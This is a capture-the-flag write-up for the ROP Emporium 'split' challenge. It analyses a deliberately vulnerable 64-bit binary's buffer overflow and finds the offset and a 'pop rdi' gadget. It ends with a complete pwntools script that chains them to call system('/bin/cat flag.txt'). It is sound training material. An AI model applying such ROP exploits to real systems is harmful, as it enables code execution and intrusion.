# Challenge 2 - split
## Description
This is the second of the ROP Emporium challenges. [split](https://ropemporium.com/challenge/split.html)

"Combine elements from the ret2win challenge that have been split apart to beat this challenge. Learn how to use another tool whilst crafting a short ROP chain."

Let's start, as usual, by inspecting the binary:

```
mfumega@pwn-boy:/pwn-boy$ file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
mfumega@pwn-boy:/pwn-boy$ pwn checksec split
[*] '/pwn-boy/split'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
After this info, let's run the binary to see what's happening 

```
mfumega@pwn-boy:/pwn-boy$ ./split
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> AAA
Thank you!

Exiting
```

So, the behaviour seems to be pretty similar to the previous one.
If we look at the functions the binary now has, we see the ret2win one is not present anymore: 
```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
[...]
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400742  usefulFunction
```

The binary is the same, but this time, we have a function called "usefulFunction" that contains a call to `system()`.

If we inspect the binary, we'll find a string that opens the flag.txt file: 
```
pwndbg> search "/bin/cat"
Searching for byte: b'/bin/cat'
split           0x601060 '/bin/cat flag.txt'
pwndbg>
```

This will come handy later on the challenge. 

In Ghidra we can see the `pwnme()` function doing again the call on "read" for a size bigger that the variable storing it
```C
void pwnme(void)

{
  undefined1 local_28 [32];
  
  memset(local_28,0,0x20);
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  read(0,local_28,0x60);
  puts("Thank you!");
  return;
}
```

So, doing a recap, we have: 
- A buffer overflow
- An function that calls "system()" at 0x40074b (this is the address to the call to system inside the function) 
- A string containing "/bin/cat flag.txt" at 0x601060

If we take a quick look on the man page for "system", we'll see that it will run a command passed as an argument
```
NAME
       system - execute a shell command

SYNOPSIS
       #include <stdlib.h>

       int system(const char *command);
```

So, the general idea will be to run `system("/bin/cat flag.txt")`. 

To pass arguments to a function, we must rely on computer registers like this:
- RDI > First argument
- RSI > Second argument
- RDX > Third argument
- RCX > Fourth argument
- R8 > Fifth argument
- R9 > Sixth argument

So, we must store our command string on RDI, and then call `system`. 
To put a value on a register, we can use the assembler instruction "pop". This will take a value from the stack, and store it on a register. For this matter, we should use `pop RDI`.

So now we need: 
- A "pop rdi" gadget
- The address of our command string (0x601060)
- The address where system() is called on the usefulFunction (0x40074b)

Now, for the address of our "pop rdi" gadget, we'll use a tool called "ropper":
```
mfumega@pwn-boy:/pwn-boy$ ropper --file split --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: split
0x00000000004007c3: pop rdi; ret;

mfumega@pwn-boy:/pwn-boy$
```

Ok, so we know have everything we need. Let's calculate the offset for our buffer overflow running the program and inspecting the stack, just as the previous challenge:
```
 ► 0         0x400735 pwnme+77
   1         0x4006d7 main+64
   2   0x7ffff7da8d90 __libc_start_call_main+128
   3   0x7ffff7da8e40 __libc_start_main+128
   4         0x4005da _start+42
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/25gx $rsp
0x7fffffffdd00: 0x4141414141414141      0x000000000000000a
0x7fffffffdd10: 0x0000000000000000      0x0000000000000000
0x7fffffffdd20: 0x00007fffffffdd30      0x00000000004006d7
0x7fffffffdd30: 0x0000000000000001      0x00007ffff7da8d90
0x7fffffffdd40: 0x0000000000000000      0x0000000000400697
0x7fffffffdd50: 0x00000001ffffde30      0x00007fffffffde48
0x7fffffffdd60: 0x0000000000000000      0x1e63be88416db69a
0x7fffffffdd70: 0x00007fffffffde48      0x0000000000400697
0x7fffffffdd80: 0x0000000000000000      0x00007ffff7ffd040
0x7fffffffdd90: 0xe19c4177fbefb69a      0xe19c513d5be7b69a
0x7fffffffdda0: 0x00007fff00000000      0x0000000000000000
0x7fffffffddb0: 0x0000000000000000      0x00007fffffffde48
0x7fffffffddc0: 0x0000000000000000
pwndbg>
```

We see our input starting at 0x7fffffffdd00 and the return address at 0x7fffffffdd28. This is an offset of 40 bytes.

Let's now build our exploit:
```python
#!/usr/bin/env python3

from pwn import *

binary_path = '/pwn-boy/split'
p = process(binary_path)

offset = 40
usefulFunction_addr = 0x40074b
pop_rdi_addr = 0x4007c3
bin_cat_addr = 0x601060

payload = b'A' * offset
payload += p64(pop_rdi_addr) + p64(bin_cat_addr)
payload += p64(usefulFunction_addr)

p.sendline(payload)
response = p.recvall()
print(response.decode('latin-1'))
```
And we got the flag. That's it for this challenge, see you on the next one! 
